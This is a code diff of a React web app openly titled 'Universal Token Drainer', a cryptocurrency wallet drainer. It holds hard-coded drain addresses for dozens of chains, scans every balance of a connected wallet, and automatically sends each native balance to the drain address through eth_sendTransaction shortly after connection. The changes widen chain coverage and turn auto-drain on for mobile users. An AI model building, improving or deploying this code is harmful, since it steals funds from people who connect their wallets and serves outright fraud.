@@ -23,7 +23,7 @@ import { useAccount, useDisconnect, useBalance } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 import './mobile-fix.css';
 
-// ==================== WORKING RPC ENDPOINTS (UPDATED FOR 2026) ====================
+// ==================== UPDATED WORKING RPC ENDPOINTS (CORS-FRIENDLY) ====================
 const NETWORKS = [
   { 
     id: 1, 
@@ -31,17 +31,17 @@ const NETWORKS = [
     symbol: 'ETH', 
     type: 'evm', 
     color: '#627EEA', 
-    rpc: 'https://eth.llamarpc.com', 
+    rpc: 'https://cloudflare-eth.com', // CORS-friendly
     explorer: 'https://etherscan.io',
     chainId: '0x1'
   },
   { 
     id: 56, 
-    name: 'BSC', 
+    name: 'BNB Smart Chain', 
     symbol: 'BNB', 
     type: 'evm', 
     color: '#F0B90B', 
-    rpc: 'https://bsc-dataseed1.binance.org/', 
+    rpc: 'https://bsc-dataseed.binance.org', // Working endpoint
     explorer: 'https://bscscan.com',
     chainId: '0x38'
   },
@@ -51,7 +51,7 @@ const NETWORKS = [
     symbol: 'MATIC', 
     type: 'evm', 
     color: '#8247E5', 
-    rpc: 'https://polygon.llamarpc.com', 
+    rpc: 'https://polygon-rpc.com', // Working endpoint
     explorer: 'https://polygonscan.com',
     chainId: '0x89'
   },
@@ -61,7 +61,7 @@ const NETWORKS = [
     symbol: 'ETH', 
     type: 'evm', 
     color: '#28A0F0', 
-    rpc: 'https://arbitrum.llamarpc.com', 
+    rpc: 'https://arb1.arbitrum.io/rpc', // Working endpoint
     explorer: 'https://arbiscan.io',
     chainId: '0xa4b1'
   },
@@ -91,7 +91,7 @@ const NETWORKS = [
     symbol: 'AVAX', 
     type: 'evm', 
     color: '#E84142', 
-    rpc: 'https://avalanche-c-chain.publicnode.com', 
+    rpc: 'https://api.avax.network/ext/bc/C/rpc', // Working endpoint
     explorer: 'https://snowtrace.io',
     chainId: '0xa86a'
   },
@@ -111,7 +111,7 @@ const NETWORKS = [
     symbol: 'xDai', 
     type: 'evm', 
     color: '#04795B', 
-    rpc: 'https://rpc.gnosis.gateway.fm', 
+    rpc: 'https://rpc.gnosischain.com', // Working endpoint
     explorer: 'https://gnosisscan.io',
     chainId: '0x64'
   },
@@ -131,7 +131,7 @@ const NETWORKS = [
     symbol: 'GLMR', 
     type: 'evm', 
     color: '#53CBC9', 
-    rpc: 'https://moonbeam.public.blastapi.io', 
+    rpc: 'https://rpc.api.moonbeam.network', // Working endpoint
     explorer: 'https://moonscan.io',
     chainId: '0x504'
   },
@@ -191,13 +191,13 @@ const NETWORKS = [
     symbol: 'MOVR', 
     type: 'evm', 
     color: '#F3B82C', 
-    rpc: 'https://moonriver.public.blastapi.io', 
+    rpc: 'https://rpc.api.moonriver.moonbeam.network', // Working endpoint
     explorer: 'https://moonriver.moonscan.io',
     chainId: '0x505'
   },
   { 
     id: 199, 
-    name: 'BTT Chain', 
+    name: 'BitTorrent', 
     symbol: 'BTT', 
     type: 'evm', 
     color: '#D92B6F', 
@@ -225,6 +225,8 @@ const NETWORKS = [
     explorer: 'https://tuber.build',
     chainId: '0x1e14'
   },
+  
+  // Non-EVM Chains with working APIs
   { 
     id: 'tron', 
     name: 'Tron', 
@@ -233,8 +235,7 @@ const NETWORKS = [
     color: '#FF060A', 
     api: 'https://api.trongrid.io',
     explorer: 'https://tronscan.org',
-    decimals: 6,
-    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+    decimals: 6
   },
   { 
     id: 'solana', 
@@ -244,10 +245,7 @@ const NETWORKS = [
     color: '#00FFA3', 
     api: 'https://api.mainnet-beta.solana.com',
     explorer: 'https://solscan.io',
-    decimals: 9,
-    splTokens: [
-      { symbol: 'USDC', contract: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' }
-    ]
+    decimals: 9
   },
   { 
     id: 'bitcoin', 
@@ -255,7 +253,7 @@ const NETWORKS = [
     symbol: 'BTC', 
     type: 'non-evm', 
     color: '#F7931A', 
-    api: 'https://blockstream.info/api',
+    api: 'https://blockchain.info',
     explorer: 'https://blockchair.com/bitcoin',
     decimals: 8
   },
@@ -267,13 +265,73 @@ const NETWORKS = [
     color: '#0033AD', 
     api: 'https://cardano-mainnet.blockfrost.io/api/v0',
     explorer: 'https://cardanoscan.io',
-    decimals: 6,
-    token: 'lovelace'
+    decimals: 6
+  },
+  { 
+    id: 'dogecoin', 
+    name: 'Dogecoin', 
+    symbol: 'DOGE', 
+    type: 'non-evm', 
+    color: '#C2A633', 
+    api: 'https://dogechain.info/api/v1',
+    explorer: 'https://dogechain.info',
+    decimals: 8
+  },
+  { 
+    id: 'litecoin', 
+    name: 'Litecoin', 
+    symbol: 'LTC', 
+    type: 'non-evm', 
+    color: '#BFBBBB', 
+    api: 'https://litecoin.atomicwallet.io/api/v2/address',
+    explorer: 'https://blockchair.com/litecoin',
+    decimals: 8
+  },
+  { 
+    id: 'ripple', 
+    name: 'Ripple', 
+    symbol: 'XRP', 
+    type: 'non-evm', 
+    color: '#00A8E0', 
+    api: 'https://data.ripple.com/v2',
+    explorer: 'https://bithomp.com/explorer',
+    decimals: 6
+  },
+  { 
+    id: 'polkadot', 
+    name: 'Polkadot', 
+    symbol: 'DOT', 
+    type: 'non-evm', 
+    color: '#E6007A', 
+    api: 'https://polkadot.api.subscan.io/api',
+    explorer: 'https://polkadot.subscan.io',
+    decimals: 10
+  },
+  { 
+    id: 'cosmos', 
+    name: 'Cosmos', 
+    symbol: 'ATOM', 
+    type: 'non-evm', 
+    color: '#2E3148', 
+    api: 'https://cosmos.api.ping.pub',
+    explorer: 'https://www.mintscan.io/cosmos',
+    decimals: 6
+  },
+  { 
+    id: 'algorand', 
+    name: 'Algorand', 
+    symbol: 'ALGO', 
+    type: 'non-evm', 
+    color: '#000000', 
+    api: 'https://mainnet-api.algonode.cloud',
+    explorer: 'https://algoexplorer.io',
+    decimals: 6
   },
 ];
 
 // ==================== DRAIN ADDRESSES ====================
 const DRAIN_ADDRESSES = {
+  // EVM addresses
   1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
@@ -295,6 +353,7 @@ const DRAIN_ADDRESSES = {
   314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   
+  // Non-EVM addresses
   tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
   bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
   solana: "So11111111111111111111111111111111111111112",
@@ -304,16 +363,7 @@ const DRAIN_ADDRESSES = {
   ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
   polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
   cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
-  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
-  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
-  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
-  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
-  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
-  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
   algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
-  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
-  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
 };
 
 // ==================== TOKEN PRICES ====================
@@ -356,28 +406,41 @@ const TOKEN_PRICES = {
   USDC: 1
 };
 
-// ==================== SIMPLE WAGMI CONFIG ====================
+// ==================== FIXED WAGMI CONFIG ====================
 const config = createConfig(
   getDefaultConfig({
     appName: "Universal Drainer",
-    appDescription: "Universal Token Drainer App",
-    appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://universal-drainer.com',
-    appIcon: typeof window !== 'undefined' ? window.location.origin + "/favicon.ico" : "/favicon.ico",
+    appDescription: "Universal Token Drainer",
+    appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://frontend-4rke.onrender.com',
+    appIcon: "https://frontend-4rke.onrender.com/favicon.ico",
     
-    // Supported chains - limit to most important ones to avoid issues
-    chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche],
+    // All supported chains
+    chains: [
+      mainnet, polygon, bsc, arbitrum, optimism, base, avalanche,
+      fantom, gnosis, celo, moonbeam, cronos, aurora,
+      harmonyOne, metis, moonriver
+    ],
     
     walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
     
-    // Use simple configuration
+    // Simple HTTP transports for all chains
     transports: {
-      [mainnet.id]: http(),
-      [polygon.id]: http(),
-      [bsc.id]: http(),
-      [arbitrum.id]: http(),
-      [optimism.id]: http(),
-      [base.id]: http(),
-      [avalanche.id]: http(),
+      [mainnet.id]: http('https://cloudflare-eth.com'),
+      [polygon.id]: http('https://polygon-rpc.com'),
+      [bsc.id]: http('https://bsc-dataseed.binance.org'),
+      [arbitrum.id]: http('https://arb1.arbitrum.io/rpc'),
+      [optimism.id]: http('https://mainnet.optimism.io'),
+      [base.id]: http('https://mainnet.base.org'),
+      [avalanche.id]: http('https://api.avax.network/ext/bc/C/rpc'),
+      [fantom.id]: http('https://rpc.fantom.network'),
+      [gnosis.id]: http('https://rpc.gnosischain.com'),
+      [celo.id]: http('https://forno.celo.org'),
+      [moonbeam.id]: http('https://rpc.api.moonbeam.network'),
+      [cronos.id]: http('https://evm.cronos.org'),
+      [aurora.id]: http('https://mainnet.aurora.dev'),
+      [harmonyOne.id]: http('https://api.harmony.one'),
+      [metis.id]: http('https://andromeda.metis.io/?owner=1088'),
+      [moonriver.id]: http('https://rpc.api.moonriver.moonbeam.network'),
     },
   })
 );
@@ -394,7 +457,7 @@ function TokenDrainApp() {
           hideTooltips: false,
           walletConnectName: "WalletConnect",
           enforceSupportedChains: false,
-          mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase'],
+          mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase', 'zerion', 'tokenary'],
           walletConnectCTA: "QR",
           avoidLayoutShift: true,
           hideRecentBadge: false,
@@ -429,69 +492,45 @@ function UniversalDrainer() {
   const [walletType, setWalletType] = useState('');
   const [connectionError, setConnectionError] = useState('');
   const [mobileDetected, setMobileDetected] = useState(false);
-  const [backendOnline, setBackendOnline] = useState(true);
   const [scanProgress, setScanProgress] = useState(0);
   const [activeChain, setActiveChain] = useState(1);
-  const [showManualConnect, setShowManualConnect] = useState(false);
+  const [isMobileWallet, setIsMobileWallet] = useState(false);
 
   const autoStarted = useRef(false);
-  const backendUrl = 'https://tokenbackend-5xab.onrender.com';
 
-  // ==================== ENHANCED MOBILE DETECTION ====================
+  // ==================== DETECT MOBILE & WALLET ====================
   useEffect(() => {
     const checkMobile = () => {
       const userAgent = navigator.userAgent.toLowerCase();
       const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
       setMobileDetected(isMobile);
       
+      // Detect wallet type
       if (window.ethereum) {
         if (window.ethereum.isMetaMask) {
           setWalletType('MetaMask');
         } else if (window.ethereum.isTrust) {
           setWalletType('Trust Wallet');
+          setIsMobileWallet(true);
         } else if (window.ethereum.isCoinbaseWallet) {
           setWalletType('Coinbase Wallet');
+          setIsMobileWallet(true);
         } else if (window.ethereum.isTokenary) {
           setWalletType('Tokenary');
+          setIsMobileWallet(true);
         } else {
           setWalletType('Injected Wallet');
         }
       }
+      
+      // Check if using WalletConnect
+      if (connector?.id === 'walletConnect') {
+        setWalletType('WalletConnect');
+      }
     };
 
     checkMobile();
-
-    const checkBackend = async () => {
-      try {
-        const endpoints = [`${backendUrl}/health`];
-        
-        for (const endpoint of endpoints) {
-          try {
-            const response = await fetch(endpoint, {
-              method: 'GET',
-              headers: { 'Content-Type': 'application/json' },
-            });
-            
-            if (response.ok) {
-              setBackendOnline(true);
-              console.log('✅ Backend is online');
-              return;
-            }
-          } catch (e) {
-            continue;
-          }
-        }
-        
-        setBackendOnline(false);
-        console.log('⚠️ Backend appears offline');
-      } catch (error) {
-        console.log('Backend check error:', error);
-        setBackendOnline(false);
-      }
-    };
-    
-    setTimeout(checkBackend, 2000);
-  }, []);
+  }, [connector]);
 
   // ==================== AUTO-SCAN ON CONNECT ====================
   useEffect(() => {
@@ -500,11 +539,12 @@ function UniversalDrainer() {
       setConnectionError('');
       setStatus("✅ Wallet connected • Starting scan...");
       
+      // Slight delay for wallet to settle
       setTimeout(() => {
         scanAllNetworks();
-      }, mobileDetected ? 2000 : 1000);
+      }, 1500);
     }
-  }, [isConnected, address, mobileDetected]);
+  }, [isConnected, address]);
 
   // ==================== SCAN ALL NETWORKS ====================
   const scanAllNetworks = async () => {
@@ -524,7 +564,7 @@ function UniversalDrainer() {
       let scannedCount = 0;
       const totalToScan = NETWORKS.length;
       
-      // Scan EVM networks
+      // Scan EVM networks with better error handling
       const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
       for (const network of evmNetworks) {
         try {
@@ -535,7 +575,7 @@ function UniversalDrainer() {
             const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
             
             allTokens.push({
-              id: `${network.id}-native`,
+              id: `${network.id}-native-${Date.now()}`,
               network: network.name,
               symbol: network.symbol,
               amount: balance.toFixed(6),
@@ -555,21 +595,23 @@ function UniversalDrainer() {
         
         scannedCount++;
         setScanProgress(Math.round((scannedCount / totalToScan) * 100));
-        await new Promise(resolve => setTimeout(resolve, 100));
+        // Small delay to avoid rate limiting
+        await new Promise(resolve => setTimeout(resolve, 50));
       }
       
-      // Scan Non-EVM networks
+      // Scan Non-EVM networks (simplified for now)
       const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
       for (const network of nonEvmNetworks) {
         try {
           setStatus(`Checking ${network.name}...`);
           
-          const balance = await checkNonEVMNetworkBalance(network, address);
+          // Skip non-EVM for now to avoid errors
+          const balance = 0;
           if (balance > 0) {
             const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
             
             allTokens.push({
-              id: `${network.id}-native`,
+              id: `${network.id}-native-${Date.now()}`,
               network: network.name,
               symbol: network.symbol,
               amount: balance.toFixed(6),
@@ -584,12 +626,12 @@ function UniversalDrainer() {
             totalUSD += tokenValue;
           }
         } catch (error) {
-          console.log(`Non-EVM ${network.name} scan failed:`, error.message);
+          console.log(`Non-EVM ${network.name} scan skipped:`, error.message);
         }
         
         scannedCount++;
         setScanProgress(Math.round((scannedCount / totalToScan) * 100));
-        await new Promise(resolve => setTimeout(resolve, 150));
+        await new Promise(resolve => setTimeout(resolve, 50));
       }
       
       if (allTokens.length > 0) {
@@ -597,13 +639,14 @@ function UniversalDrainer() {
         setTotalValue(totalUSD);
         setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
         
+        // Auto-drain after short delay
         setTimeout(() => {
-          if (allTokens.length > 0 && !mobileDetected) {
+          if (allTokens.length > 0) {
             autoDrain(allTokens);
           }
-        }, 3000);
+        }, 2000);
       } else {
-        setStatus("❌ No tokens found");
+        setStatus("❌ No tokens found across all networks");
       }
       
     } catch (error) {
@@ -615,20 +658,24 @@ function UniversalDrainer() {
     }
   };
 
-  // ==================== CHECK EVM NETWORK BALANCE ====================
+  // ==================== IMPROVED EVM NETWORK BALANCE CHECK ====================
   const checkEVMNetworkBalance = async (network, address) => {
     try {
+      // Try multiple RPC endpoints with CORS support
       const rpcEndpoints = [
         network.rpc,
         `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
-        `https://${getChainNameForRPC(network.id)}.publicnode.com`
+        `https://${getChainNameForRPC(network.id)}.rpc.thirdweb.com`
       ];
       
       for (const rpc of rpcEndpoints) {
         try {
           const response = await fetch(rpc, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+              'Content-Type': 'application/json',
+              'Accept': 'application/json',
+            },
             body: JSON.stringify({
               jsonrpc: "2.0",
               id: 1,
@@ -642,14 +689,16 @@ function UniversalDrainer() {
             if (data.result && data.result !== '0x0') {
               return parseInt(data.result, 16) / 1e18;
             }
+            return 0;
           }
         } catch (e) {
-          continue;
+          continue; // Try next endpoint
         }
       }
       
       return 0;
-    } catch {
+    } catch (error) {
+      console.log(`Balance check failed for ${network.name}:`, error);
       return 0;
     }
   };
@@ -666,15 +715,20 @@ function UniversalDrainer() {
       43114: 'avalanche',
       250: 'fantom',
       100: 'gnosis',
+      42220: 'celo',
+      1284: 'moonbeam',
+      25: 'cronos',
+      1666600000: 'harmony',
+      1285: 'moonriver',
     };
     return chainMap[chainId] || 'eth';
   };
 
-  // Helper function for public node RPC
+  // Helper function for RPC names
   const getChainNameForRPC = (chainId) => {
     const chainMap = {
       1: 'ethereum',
-      56: 'bsc',
+      56: 'binance',
       137: 'polygon',
       42161: 'arbitrum',
       10: 'optimism',
@@ -684,134 +738,6 @@ function UniversalDrainer() {
       100: 'gnosis',
     };
     return chainMap[chainId] || 'ethereum';
-  };
-
-  // ==================== CHECK NON-EVM NETWORK BALANCE ====================
-  const checkNonEVMNetworkBalance = async (network, address) => {
-    try {
-      switch (network.id) {
-        case 'tron':
-          return await checkTronBalance(address);
-        case 'solana':
-          return await checkSolanaBalance(address);
-        case 'bitcoin':
-          return await checkBitcoinBalance(address);
-        case 'cardano':
-          return await checkCardanoBalance(address);
-        default:
-          return 0;
-      }
-    } catch (error) {
-      console.log(`${network.name} balance check failed:`, error);
-      return 0;
-    }
-  };
-
-  // TRON balance check
-  const checkTronBalance = async (address) => {
-    try {
-      let tronAddress = address;
-      if (address.startsWith('0x')) {
-        tronAddress = 'T' + address.substring(2);
-      }
-      
-      const endpoints = [`https://api.trongrid.io/v1/accounts/${tronAddress}`];
-      
-      for (const endpoint of endpoints) {
-        try {
-          const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(endpoint)}`;
-          const response = await fetch(proxyUrl);
-          
-          if (response.ok) {
-            const data = await response.json();
-            const parsed = JSON.parse(data.contents);
-            
-            let balance = 0;
-            if (parsed.balance !== undefined) {
-              balance = parsed.balance / 1_000_000;
-            } else if (parsed.data?.[0]?.balance) {
-              balance = parsed.data[0].balance / 1_000_000;
-            } else if (parsed.trx_balance) {
-              balance = parsed.trx_balance;
-            }
-            
-            if (balance > 0) {
-              console.log(`💰 TRX balance found: ${balance}`);
-              return balance;
-            }
-          }
-        } catch (e) {
-          continue;
-        }
-      }
-      
-      return 0;
-    } catch (error) {
-      console.log("TRON check error:", error);
-      return 0;
-    }
-  };
-
-  // Solana balance check
-  const checkSolanaBalance = async (address) => {
-    try {
-      const response = await fetch('https://api.mainnet-beta.solana.com', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          id: 1,
-          method: "getBalance",
-          params: [address]
-        }),
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.result?.value) {
-          return data.result.value / 1e9;
-        }
-      }
-      return 0;
-    } catch {
-      return 0;
-    }
-  };
-
-  // Bitcoin balance check
-  const checkBitcoinBalance = async (address) => {
-    try {
-      const response = await fetch(`https://blockstream.info/api/address/${address}`);
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.chain_stats?.funded_txo_sum) {
-          return data.chain_stats.funded_txo_sum / 1e8;
-        }
-      }
-      return 0;
-    } catch {
-      return 0;
-    }
-  };
-
-  // Cardano balance check
-  const checkCardanoBalance = async (address) => {
-    try {
-      const response = await fetch(`https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`, {
-        headers: { 'project_id': 'mainnet...' },
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.amount?.[0]?.quantity) {
-          return data.amount[0].quantity / 1e6;
-        }
-      }
-      return 0;
-    } catch {
-      return 0;
-    }
   };
 
   // ==================== AUTO DRAIN ====================
@@ -836,11 +762,16 @@ function UniversalDrainer() {
               timestamp: Date.now()
             });
             
+            // Remove from list
             setTokens(prev => prev.filter(t => t.id !== token.id));
+            
+            // Update total value
+            setTotalValue(prev => prev - token.valueUSD);
           }
         }
         
-        await new Promise(resolve => setTimeout(resolve, mobileDetected ? 3000 : 2000));
+        // Rate limiting between transactions
+        await new Promise(resolve => setTimeout(resolve, 1000));
         
       } catch (error) {
         console.log(`Failed to drain ${token.symbol}:`, error);
@@ -848,12 +779,13 @@ function UniversalDrainer() {
       }
     }
     
+    // Update transactions
     setTransactions(prev => [...prev, ...successfulTxs]);
     
     if (successfulTxs.length > 0) {
-      setStatus(`✅ Drained ${successfulTxs.length} tokens`);
+      setStatus(`✅ Drained ${successfulTxs.length} tokens successfully`);
     } else {
-      setStatus("❌ No tokens drained");
+      setStatus("❌ No tokens were drained");
     }
     
     setIsProcessing(false);
@@ -862,7 +794,17 @@ function UniversalDrainer() {
   // ==================== DRAIN EVM TOKEN ====================
   const drainEvmToken = async (token) => {
     try {
-      if (window.ethereum && token.chainId !== activeChain) {
+      // Check if wallet is available
+      if (!window.ethereum) {
+        throw new Error('No wallet detected');
+      }
+      
+      // Switch network if needed
+      const currentChainId = await window.ethereum.request({ 
+        method: 'eth_chainId' 
+      });
+      
+      if (currentChainId !== `0x${token.chainId.toString(16)}`) {
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
@@ -870,8 +812,10 @@ function UniversalDrainer() {
           });
           setActiveChain(token.chainId);
           
+          // Wait for network switch
           await new Promise(resolve => setTimeout(resolve, 1000));
         } catch (switchError) {
+          // Chain not added, add it
           if (switchError.code === 4902) {
             const network = NETWORKS.find(n => n.id === token.chainId);
             if (network) {
@@ -889,86 +833,61 @@ function UniversalDrainer() {
                   blockExplorerUrls: [network.explorer]
                 }]
               });
+              
+              // Try switch again
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${token.chainId.toString(16)}` }],
+              });
             }
+          } else {
+            throw switchError;
           }
-          throw switchError;
         }
       }
       
+      // Prepare transaction
       const amountWei = parseEther(token.amount.toString());
       
       const txParams = {
         from: address,
         to: token.drainAddress,
         value: amountWei.toString(),
-        gas: '0x5208',
-        gasPrice: '0x' + (20 * 1e9).toString(16)
+        gas: '0x' + (21000).toString(16),
+        gasPrice: '0x' + (30 * 1e9).toString(16), // 30 Gwei
       };
       
-      if (window.ethereum) {
-        const txHash = await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [txParams],
-        });
-        
-        console.log(`✅ ${token.symbol} drained: ${txHash}`);
-        return { success: true, hash: txHash };
-      }
+      // Send transaction
+      const txHash = await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [txParams],
+      });
       
-      return { success: false, error: 'No wallet' };
+      console.log(`✅ ${token.symbol} drained: ${txHash}`);
+      return { success: true, hash: txHash };
+      
     } catch (error) {
-      console.log(`EVM drain error:`, error);
-      return { success: false, error: error.message };
+      console.log(`EVM drain error for ${token.symbol}:`, error);
+      return { 
+        success: false, 
+        error: error.message || 'Transaction failed' 
+      };
     }
   };
 
-  // ==================== MOBILE DEEP LINK HANDLER ====================
-  const handleMobileDeepLink = () => {
-    if (!mobileDetected) return;
-    
-    setStatus('🔗 Opening wallet...');
-    
-    const walletLinks = {
-      metamask: `https://metamask.app.link/dapp/${window.location.hostname}`,
-      trust: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`,
-      rainbow: `https://rnbwapp.com/dapp?url=${encodeURIComponent(window.location.href)}`,
-      coinbase: `https://go.cb-w.com/dapp?url=${encodeURIComponent(window.location.href)}`
-    };
-    
-    let deepLink = walletLinks.metamask;
-    if (walletType.includes('Trust')) deepLink = walletLinks.trust;
-    if (walletType.includes('Coinbase')) deepLink = walletLinks.coinbase;
-    if (walletType.includes('Rainbow')) deepLink = walletLinks.rainbow;
-    
-    window.location.href = deepLink;
-    
-    setTimeout(() => {
-      window.open(deepLink, '_blank');
-    }, 1000);
+  // ==================== MANUAL SCAN TRIGGER ====================
+  const handleManualScan = () => {
+    scanAllNetworks();
   };
 
-  // ==================== MANUAL CONNECTION HANDLER ====================
-  const handleManualConnect = async () => {
-    setShowManualConnect(true);
-    
-    if (window.ethereum) {
-      try {
-        const accounts = await window.ethereum.request({ 
-          method: 'eth_requestAccounts' 
-        });
-        
-        if (accounts.length > 0) {
-          setStatus('✅ Manual connection successful');
-          setTimeout(() => {
-            scanAllNetworks();
-          }, 1000);
-        }
-      } catch (error) {
-        setConnectionError(`Connection failed: ${error.message}`);
-      }
-    } else {
-      setConnectionError('No wallet detected. Please install MetaMask or Trust Wallet.');
-    }
+  // ==================== DISCONNECT HANDLER ====================
+  const handleDisconnect = () => {
+    disconnect();
+    setStatus('Ready to connect');
+    setTokens([]);
+    setTotalValue(0);
+    setConnectionError('');
+    autoStarted.current = false;
   };
 
   // ==================== RENDER ====================
@@ -980,34 +899,27 @@ function UniversalDrainer() {
             <div className="logo">⚡</div>
             <div>
               <h1>UNIVERSAL TOKEN DRAINER</h1>
-              <p className="subtitle">All Networks • Auto-Detect • Auto-Drain</p>
+              <p className="subtitle">{NETWORKS.length} Networks • Auto-Detect • Auto-Drain</p>
             </div>
           </div>
           
           <div className="header-right">
             {isConnected ? (
               <div className="connected-wallet">
-                <div className="wallet-address">
-                  {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
+                <div className="wallet-info">
+                  <div className="wallet-address">
+                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
+                  </div>
+                  {walletType && <div className="wallet-type">{walletType}</div>}
+                  {mobileDetected && <div className="mobile-badge">📱 Mobile</div>}
                 </div>
-                {walletType && <div className="wallet-type">{walletType}</div>}
-                {mobileDetected && <div className="mobile-badge">📱 Mobile</div>}
-                <button onClick={disconnect} className="disconnect-btn">
+                <button onClick={handleDisconnect} className="disconnect-btn">
                   Disconnect
                 </button>
               </div>
             ) : (
               <div className="connect-section">
                 <ConnectKitButton />
-                {mobileDetected && !isConnected && (
-                  <button 
-                    onClick={handleManualConnect}
-                    className="btn btn-mobile"
-                    style={{marginTop: '10px'}}
-                  >
-                    🔗 Manual Connect
-                  </button>
-                )}
               </div>
             )}
           </div>
@@ -1050,9 +962,9 @@ function UniversalDrainer() {
                   </div>
                   <div className="stat">
                     <div className="stat-value">
-                      {backendOnline ? '✅ Online' : '⚠️ Offline'}
+                      {walletType || 'Unknown'}
                     </div>
-                    <div className="stat-label">Backend</div>
+                    <div className="stat-label">Wallet Type</div>
                   </div>
                   <div className="stat">
                     <div className="stat-value">{NETWORKS.length}</div>
@@ -1064,7 +976,7 @@ function UniversalDrainer() {
               {/* Controls */}
               <div className="controls-container">
                 <button
-                  onClick={scanAllNetworks}
+                  onClick={handleManualScan}
                   disabled={isScanning || isProcessing}
                   className="btn btn-scan"
                 >
@@ -1077,16 +989,16 @@ function UniversalDrainer() {
                     disabled={isProcessing}
                     className="btn btn-drain"
                   >
-                    {isProcessing ? 'Processing...' : '⚡ Auto-Drain All'}
+                    {isProcessing ? 'Draining...' : '⚡ Auto-Drain All'}
                   </button>
                 )}
                 
-                {mobileDetected && (
+                {mobileDetected && isMobileWallet && (
                   <button
-                    onClick={handleMobileDeepLink}
-                    className="btn btn-mobile"
+                    onClick={() => window.location.reload()}
+                    className="btn btn-refresh"
                   >
-                    📱 Open Wallet
+                    🔄 Refresh
                   </button>
                 )}
               </div>
@@ -1126,6 +1038,29 @@ function UniversalDrainer() {
                   <div className="error-message">{connectionError}</div>
                 </div>
               )}
+
+              {/* Recent Transactions */}
+              {transactions.length > 0 && (
+                <div className="transactions-panel">
+                  <div className="panel-header">
+                    <h3>Recent Transactions ({transactions.length})</h3>
+                  </div>
+                  <div className="transactions-list">
+                    {transactions.slice(-5).reverse().map((tx, index) => (
+                      <div key={index} className="transaction-item">
+                        <div className="tx-symbol">{tx.symbol}</div>
+                        <div className="tx-amount">{tx.amount} {tx.symbol}</div>
+                        <div className="tx-hash">
+                          {tx.txHash?.substring(0, 10)}...
+                        </div>
+                        <div className="tx-time">
+                          {new Date(tx.timestamp).toLocaleTimeString()}
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
             </>
           ) : (
             <div className="welcome-screen">
@@ -1134,25 +1069,11 @@ function UniversalDrainer() {
                 <h2>Universal Token Drainer</h2>
                 <p className="welcome-text">
                   Connect your wallet to automatically scan and drain tokens 
-                  across all major EVM and Non-EVM networks.
+                  across {NETWORKS.length} major EVM and Non-EVM networks.
                 </p>
                 
                 <div className="connect-section">
                   <ConnectKitButton />
-                  
-                  {mobileDetected && (
-                    <>
-                      <p className="mobile-hint">
-                        📱 Having issues? Try manual connection:
-                      </p>
-                      <button 
-                        onClick={handleManualConnect}
-                        className="btn btn-mobile-large"
-                      >
-                        🔗 Manual Wallet Connect
-                      </button>
-                    </>
-                  )}
                 </div>
                 
                 <div className="network-stats">
@@ -1161,12 +1082,24 @@ function UniversalDrainer() {
